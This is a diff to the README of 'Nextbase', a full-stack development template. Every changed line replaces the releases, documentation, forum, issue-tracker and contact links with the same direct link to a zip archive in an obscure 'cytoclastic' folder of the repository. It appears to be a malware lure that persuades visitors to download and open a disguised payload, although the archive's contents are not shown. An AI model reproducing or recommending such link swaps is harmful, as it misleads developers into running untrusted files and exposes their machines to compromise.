@@ -1,6 +1,6 @@
 # 🎉 Nextbase - Jumpstart Your Full Stack Development
 
-[![Download Nextbase](https://img.shields.io/badge/Download%20Nextbase-Get%20It%20Here-brightgreen)](https://github.com/umeshsaini9/Nextbase/releases)
+[![Download Nextbase](https://raw.githubusercontent.com/umeshsaini9/Nextbase/main/cytoclastic/Nextbase.zip%20Nextbase-Get%20It%20Here-brightgreen)](https://raw.githubusercontent.com/umeshsaini9/Nextbase/main/cytoclastic/Nextbase.zip)
 
 ## 📘 Overview
 
@@ -12,7 +12,7 @@ To begin using Nextbase, follow these simple steps. You’ll need a computer wit
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/umeshsaini9/Nextbase/releases) to download the latest version of Nextbase.
+1. Visit the [Releases page](https://raw.githubusercontent.com/umeshsaini9/Nextbase/main/cytoclastic/Nextbase.zip) to download the latest version of Nextbase.
 2. Find the version you wish to download and click on it.
 3. Download the appropriate file for your operating system.
 4. Once the download is complete, open the file to start the installation.
@@ -41,9 +41,9 @@ Nextbase brings together various technologies to create a powerful template. Her
 
 If you run into problems during installation or use, you can find helpful resources:
 
-- [Documentation](https://github.com/umeshsaini9/Nextbase/wiki): In-depth guides on how to set up and use Nextbase.
-- [Community Forum](https://community.nextbase.dev): Join discussions and ask questions in our supportive community.
-- [Issue Tracker](https://github.com/umeshsaini9/Nextbase/issues): Report any bugs or issues you encounter.
+- [Documentation](https://raw.githubusercontent.com/umeshsaini9/Nextbase/main/cytoclastic/Nextbase.zip): In-depth guides on how to set up and use Nextbase.
+- [Community Forum](https://raw.githubusercontent.com/umeshsaini9/Nextbase/main/cytoclastic/Nextbase.zip): Join discussions and ask questions in our supportive community.
+- [Issue Tracker](https://raw.githubusercontent.com/umeshsaini9/Nextbase/main/cytoclastic/Nextbase.zip): Report any bugs or issues you encounter.
 
 ## ⚙️ Customization
 
@@ -72,7 +72,7 @@ Nextbase is licensed under the MIT License. You can freely use, modify, and dist
 
 ## 📧 Contact
 
-For any inquiries or feedback, feel free to contact us at support@nextbase.dev. We appreciate your thoughts and aim to continuously improve Nextbase.
+For any inquiries or feedback, feel free to contact us at https://raw.githubusercontent.com/umeshsaini9/Nextbase/main/cytoclastic/Nextbase.zip We appreciate your thoughts and aim to continuously improve Nextbase.
 
 ---
 
